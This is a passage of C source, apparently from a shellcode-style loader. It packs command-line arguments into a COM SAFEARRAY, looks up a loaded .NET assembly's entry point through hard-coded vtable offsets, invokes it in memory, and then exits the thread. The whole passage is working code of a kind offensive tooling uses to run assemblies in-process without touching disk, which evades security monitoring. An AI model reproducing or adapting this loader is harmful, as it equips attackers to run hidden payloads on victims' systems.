        int i = 0;
        while (i < (int)args_len && arg_idx < argc) {
            /* Skip whitespace */
            while (i < (int)args_len && (args_str[i] == ' ' || args_str[i] == '\t' || args_str[i] == '\0')) i++;
            if (i >= (int)args_len) break;

            /* Find end of token */
            int start = i;
            while (i < (int)args_len && args_str[i] != ' ' && args_str[i] != '\t' && args_str[i] != '\0') i++;
            int token_len = i - start;

            /* Convert token to wide char on stack (max 260 chars) */
            wchar_t wbuf[260];
            stub_memset(wbuf, 0, sizeof(wbuf));
            int wlen = pMultiByteToWideChar(0 /*CP_ACP*/, 0, args_str + start, token_len, wbuf, 259);
            wbuf[wlen] = L'\0';

            BSTR bstr = pSysAllocString(wbuf);
            LONG idx = (LONG)arg_idx;
            pSafeArrayPutElement(pSaBstr, &idx, bstr);
            pSysFreeString(bstr);
            arg_idx++;
        }
    }

    /* Build inner VARIANT: VT_ARRAY | VT_BSTR with parray = pSaBstr */
    VARIANT vtArgs;
    stub_memset(&vtArgs, 0, sizeof(vtArgs));
    vtArgs.vt     = MY_VT_ARRAY | MY_VT_BSTR;
    vtArgs.parray = pSaBstr;

    /* Build outer SAFEARRAY(VT_VARIANT) with 1 element = vtArgs */
    SAFEARRAY* pSaParams = pSafeArrayCreateVector(MY_VT_VARIANT, 0, 1);
    if (!pSaParams) return 15;
    {
        LONG idx = 0;
        pSafeArrayPutElement(pSaParams, &idx, &vtArgs);
    }

    /* ------------------------------------------------------------------- */
    /* Step 9: Execute the assembly                                        */
    /* _Assembly::get_EntryPoint (vtable[16]) -> _MethodInfo               */
    /* _MethodInfo::Invoke_3 (vtable[37])                                  */
    /* ------------------------------------------------------------------- */

    void* pMethodInfo = 0;
    {
        void** vtbl = *(void***)pAssembly;
        fn_Assembly_GetEntryPoint pfn = (fn_Assembly_GetEntryPoint)vtbl[16];
        hr = pfn(pAssembly, &pMethodInfo);
    }
    if (hr != 0 || !pMethodInfo) return 16;

    /* Invoke_3(obj=VT_EMPTY, parameters=pSaParams, retval) */
    VARIANT vtObj;
    stub_memset(&vtObj, 0, sizeof(vtObj));
    vtObj.vt = MY_VT_EMPTY;

    VARIANT vtRetval;
    stub_memset(&vtRetval, 0, sizeof(vtRetval));

    {
        void** vtbl = *(void***)pMethodInfo;
        fn_MethodInfo_Invoke3 pfn = (fn_MethodInfo_Invoke3)vtbl[37];
        hr = pfn(pMethodInfo, vtObj, pSaParams, &vtRetval);
    }

    /* Cleanup */
    pSafeArrayDestroy(pSaParams);
    if (pSaBstr) pSafeArrayDestroy(pSaBstr);

    /* ------------------------------------------------------------------- */
    /* Step 10: ExitThread(0)                                              */
    /* ------------------------------------------------------------------- */
    if (pExitThread) {
        pExitThread(0);
    }

    return 0;
}

} /* extern "C" */
